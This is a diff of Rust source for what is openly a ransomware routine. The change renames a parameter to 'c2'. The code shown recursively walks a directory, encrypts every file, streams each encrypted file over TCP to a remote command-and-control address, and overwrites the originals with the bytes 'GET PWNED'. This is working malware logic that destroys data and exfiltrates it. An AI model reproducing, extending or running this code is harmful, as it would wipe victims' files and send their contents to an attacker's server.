@@ -13,11 +13,11 @@ use std::{
 
 static TAUNT: &[u8; 9] = b"GET PWNED";
 
-pub fn ransom(root: &str, catcher: &str) {
+pub fn ransom(root: &str, c2: &str) {
     info!("ransom mode");
     let files = read_dir(root);
     if let Ok(entries) = files {
-        encrypt_dir(entries, catcher)
+        encrypt_dir(entries, c2)
     } else {
         error!("could not read {root:?}")
     }
@@ -87,17 +87,17 @@ impl From<&DirEntry> for EncryptedFile {
     }
 }
 
-fn encrypt_dir(files: ReadDir, catcher: &str) {
+fn encrypt_dir(files: ReadDir, c2: &str) {
     for file in files {
         info!("entry {file:?}:");
         if let Ok(entry) = file {
             if let Ok(filetype) = entry.file_type() {
                 if filetype.is_dir() {
                     if let Ok(new_files) = read_dir(entry.path()) {
-                        encrypt_dir(new_files, catcher)
+                        encrypt_dir(new_files, c2)
                     }
                 } else {
-                    encrypt_file(entry, catcher)
+                    encrypt_file(entry, c2)
                 }
             } else {
                 error!("could not determine file type");
@@ -108,19 +108,19 @@ fn encrypt_dir(files: ReadDir, catcher: &str) {
     }
 }
 
-fn encrypt_file(file: DirEntry, catcher: &str) {
+fn encrypt_file(file: DirEntry, c2: &str) {
     let enc_file: EncryptedFile = EncryptedFile::from(&file);
     info!(
         "encrypted {} bytes for {file:?}",
         enc_file.ciphertext().len()
     );
-    exfiltrate(enc_file, catcher);
+    exfiltrate(enc_file, c2);
     overwrite(file, TAUNT.to_vec()) // CAUTION: OVERWRITES ALL FILES BELOW CURRENT DIRECTORY NODE
 }
 
 use std::net::TcpStream;
-fn exfiltrate(file: EncryptedFile, catcher: &str) {
-    if let Ok(mut stream) = TcpStream::connect(catcher) {
+fn exfiltrate(file: EncryptedFile, c2: &str) {
+    if let Ok(mut stream) = TcpStream::connect(c2) {
         let serialized: Vec<u8> = match bincode::serialize(&file) {
             Ok(ser) => ser,
             Err(e) => {
@@ -129,7 +129,7 @@ fn exfiltrate(file: EncryptedFile, catcher: &str) {
             }
         };
 
-        info!("sending {file:?} over TCP to {catcher:?}");
+        info!("sending {file:?} over TCP to {c2:?}");
         match stream.write_all(&serialized) {
             Ok(output) => info!("{output:?}"),
             Err(e) => error!("{e:?}"),
